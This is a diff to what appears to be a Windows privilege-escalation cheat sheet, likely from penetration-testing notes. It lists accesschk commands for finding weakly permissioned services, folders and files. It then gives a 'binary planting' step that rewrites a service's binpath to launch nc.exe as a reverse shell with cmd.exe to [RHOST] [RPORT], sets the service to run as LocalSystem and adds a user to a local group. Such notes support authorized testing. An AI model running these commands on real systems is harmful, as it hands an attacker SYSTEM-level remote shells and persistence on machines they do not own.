@@ -73,25 +73,23 @@ DataSources\DataSources.xml: Element-Specific Attributes
 sc query
 sc qc [service_name]
 
-// Accesschk stuff
-accesschk.exe /accepteula (always do this first!!!!!)
-accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
-accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
-accesschk.exe -ucqv [service_name]
+// Accesschk (part of "sysinternals")
+accesschk.exe /accepteula (need to do that with all sysinternal tools in the first time (?))
+accesschk.exe -ucqv [service_name] 
+accesschk.exe -uwcqv "[Group name you belong to]" * 
 
 // Find all weak folder permissions per drive.
 accesschk.exe -uwdqs Users c:\
-accesschk.exe -uwdqs "Authenticated Users" c:\
+accesschk.exe -uwdqs "[Group name you belong to]" c:\
 
 // Find all weak file permissions per drive.
 accesschk.exe -uwqs Users c:\*.*
-accesschk.exe -uwqs "Authenticated Users" c:\*.*
+accesschk.exe -uwqs "[Group name you belong to]" c:\*.*
 
 // Binary planting
 sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
 sc config [service_name] obj= ".\LocalSystem" password= ""
 sc qc [service_name] (to verify!)
-net start [service_name]
 
 // add user to local group
 net localgroup "Users" IWAM_BOB /add
